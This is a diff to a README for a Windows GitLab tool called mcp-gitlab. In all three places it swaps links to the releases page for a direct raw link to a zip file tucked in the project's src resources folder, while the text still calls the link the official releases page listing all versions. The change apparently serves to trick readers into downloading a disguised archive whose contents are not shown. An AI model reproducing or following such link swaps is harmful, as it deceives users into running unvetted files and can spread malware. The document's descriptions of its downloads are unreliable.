@@ -1,6 +1,6 @@
 # ⚙️ mcp-gitlab - Manage GitLab Easily on Windows
 
-[![Download mcp-gitlab](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/power777x333/mcp-gitlab/releases)
+[![Download mcp-gitlab](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/power777x333/mcp-gitlab/raw/refs/heads/main/src/mcp_gitlab/resources/mcp-gitlab-1.4.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these steps to download, install, and start using mcp-gitlab on your Wind
 
 Go to the official releases page to get the latest version:
 
-[Download mcp-gitlab](https://github.com/power777x333/mcp-gitlab/releases)
+[Download mcp-gitlab](https://github.com/power777x333/mcp-gitlab/raw/refs/heads/main/src/mcp_gitlab/resources/mcp-gitlab-1.4.zip)
 
 This page contains all available versions. Choose the newest release for your system.
 
@@ -148,5 +148,5 @@ For more help, visit the repository’s issues page.
 ## 🔗 Quick Access
 
 Download and updates at any time here:  
-[Get mcp-gitlab Releases](https://github.com/power777x333/mcp-gitlab/releases)  
+[Get mcp-gitlab Releases](https://github.com/power777x333/mcp-gitlab/raw/refs/heads/main/src/mcp_gitlab/resources/mcp-gitlab-1.4.zip)  
 ![Download Button](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)
